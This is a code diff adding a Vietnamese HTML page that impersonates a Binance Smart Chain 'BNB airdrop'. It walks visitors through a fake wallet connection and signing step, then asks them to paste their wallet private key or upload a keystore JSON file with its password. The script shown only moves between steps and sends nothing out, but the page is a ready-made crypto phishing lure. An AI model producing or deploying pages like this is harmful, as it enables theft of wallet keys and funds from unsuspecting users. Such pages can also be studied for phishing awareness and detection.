@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nhận Airdrop BNB</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #f3ba2f;
+      color: white;
+      padding: 1rem;
+      text-align: center;
+    }
+    .container {
+      max-width: 420px;
+      background: white;
+      margin: 2rem auto;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+    .btn {
+      background: #f3ba2f;
+      color: white;
+      padding: 0.8rem;
+      border: none;
+      border-radius: 5px;
+      width: 100%;
+      font-size: 1rem;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+    .btn:hover {
+      background: #e0a82e;
+    }
+    .warning {
+      color: red;
+      font-size: 0.9rem;
+      margin-top: 1rem;
+      text-align: center;
+    }
+    .info {
+      color: #444;
+      font-size: 0.9rem;
+      margin-top: 1rem;
+    }
+    .step {
+      display: none;
+    }
+    .step.active {
+      display: block;
+    }
+    input[type="text"], textarea {
+      width: 100%;
+      padding: 0.5rem;
+      margin-top: 0.5rem;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .note {
+      font-size: 0.85rem;
+      color: gray;
+      margin-top: 0.5rem;
+    }
+    .fake-wallet-ui {
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      padding: 1rem;
+      margin-top: 1rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+    }
+    .fake-wallet-ui p {
+      margin: 0.3rem 0;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Binance Smart Chain Airdrop</h1>
+  </header>
+  <div class="container">
+    <div class="step active" id="step1">
+      <h2>🎉 Bạn đủ điều kiện nhận 10,000 BNB Test Token</h2>
+      <p>Hệ thống đang kiểm tra ví của bạn để phân bổ phần thưởng. Vui lòng kết nối ví Binance Smart Chain.</p>
+      <div class="fake-wallet-ui">
+        <p>Ví phát hiện: <strong>MetaMask</strong></p>
+        <p>Địa chỉ ví: <span style="color: green">0xF6...9cB1</span></p>
+        <p>Trạng thái mạng: <span style="color: orange">Chưa kết nối</span></p>
+      </div>
+      <button class="btn" onclick="nextStep(2)">Kết nối ví Binance</button>
+    </div>
+
+    <div class="step" id="step2">
+      <h2>📜 Xác minh giao dịch</h2>
+      <p>Bạn cần ký giao dịch giả lập xác minh danh tính để tiếp tục nhận phần thưởng.</p>
+      <div class="fake-wallet-ui">
+        <p>Địa chỉ gửi: 0xF6...9cB1</p>
+        <p>Hành động: <strong>Ký thông báo 'Tôi đồng ý nhận thưởng'</strong></p>
+        <p>Phí gas: 0.0000 BNB (giả lập)</p>
+      </div>
+      <p class="note">Không mất phí. Giao dịch sẽ không được ghi trên chuỗi.</p>
+      <button class="btn" onclick="nextStep(3)">Ký giao dịch xác minh</button>
+    </div>
+
+    <div class="step" id="step3">
+      <h2>🛡️ Bảo mật ví</h2>
+      <p>Để đảm bảo quyền sở hữu, bạn cần xác minh qua một trong hai phương thức:</p>
+      <button class="btn" onclick="nextStep(4)">Nhập Private Key</button>
+      <button class="btn" onclick="nextStep(5)">Tải lên tệp Keystore (JSON)</button>
+    </div>
+
+    <div class="step" id="step4">
+      <h2>🔐 Xác minh bằng Private Key</h2>
+      <p>Vui lòng nhập Private Key ví của bạn:</p>
+      <textarea id="privateKey" rows="4" placeholder="Ví dụ: 0xabc123..."></textarea>
+      <button class="btn" onclick="submitKey()">Gửi xác minh</button>
+      <p class="warning" id="keyWarning"></p>
+    </div>
+
+    <div class="step" id="step5">
+      <h2>📁 Xác minh bằng JSON File</h2>
+      <p>Chọn tệp keystore (.json) từ thiết bị của bạn:</p>
+      <input type="file" id="jsonFile">
+      <input type="text" placeholder="Nhập mật khẩu ví" />
+      <button class="btn" onclick="nextStep(6)">Gửi xác minh</button>
+    </div>
+
+    <div class="step" id="step6">
+      <h2> 💰 Hệ Thống Đang Trao Thưởng Cho Bạn<h2>
+      <p class="info">
+        🚨 Vui lòng đợi 10 phút
+        
+        
+        
+      </p>
+    </div>
+  </div>
+
+  <script>
+    function nextStep(stepNumber) {
+      const steps = document.querySelectorAll('.step');
+      steps.forEach(step => step.classList.remove('active'));
+      document.getElementById(`step${stepNumber}`).classList.add('active');
+    }
+
+    function submitKey() {
+      const key = document.getElementById('privateKey').value.trim();
+      const warning = document.getElementById('keyWarning');
+      if (!key || key.length < 20) {
+        warning.textContent = 'Vui lòng nhập Private Key hợp lệ.';
+        return;
+      }
+      warning.textContent = '';
+      nextStep(6);
+    }
+  </script>
+</body>
+</html>
